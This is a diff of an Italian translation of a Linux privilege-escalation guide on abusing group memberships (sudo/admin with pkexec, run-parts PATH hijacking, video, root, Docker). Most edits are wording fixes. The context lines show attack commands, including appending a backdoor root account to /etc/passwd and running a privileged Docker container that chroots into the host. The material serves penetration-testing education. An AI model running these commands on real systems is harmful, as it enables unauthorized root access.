@@ -6,7 +6,7 @@
 
 ### **PE - Metodo 1**
 
-**A volte**, **per impostazione predefinita (o perché qualche software ne ha bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
+**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -26,7 +26,7 @@ Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo usando `pkexec`.\
+Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, potresti probabilmente eseguire binari come sudo usando `pkexec`.\
 Questo perché tipicamente questi sono i gruppi all'interno della **politica polkit**. Questa politica identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Controllalo con:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
@@ -88,7 +88,7 @@ $ echo $PATH
 ```
 Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
 
-Dirottare il programma `run-parts` è un modo semplice per ottenere il root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
+Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -163,7 +163,7 @@ Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamen
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il **`screen.raw`** file e selezionare come tipo di file **Dati immagine raw**:
+Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e selezionare come tipo di file **Raw image data**:
 
 ![](<../../../images/image (463).png>)
 
@@ -173,7 +173,7 @@ Poi modifica la Larghezza e l'Altezza a quelle utilizzate sullo schermo e contro
 
 ## Gruppo Root
 
-Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per escalare i privilegi...
+Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per elevare i privilegi...
 
 **Controlla quali file i membri root possono modificare**:
 ```bash
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Gruppo Docker
 
-Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, in modo che quando l'istanza si avvia carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
+Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, in modo che quando l'istanza si avvia, carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,7 +193,7 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
+Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?) potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
 
 {{#ref}}
 ../docker-security/
@@ -201,9 +201,13 @@ Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzion
 
 Se hai permessi di scrittura sul socket docker leggi [**questo post su come elevare i privilegi abusando del socket docker**](../#writable-docker-socket)**.**
 
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+{{#ref}}
+https://github.com/KrustyHack/docker-privilege-escalation
+{{#endref}}
 
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+{{#ref}}
+https://fosterelli.co/privilege-escalation-via-docker.html
+{{#endref}}
 
 ## Gruppo lxc/lxd
 
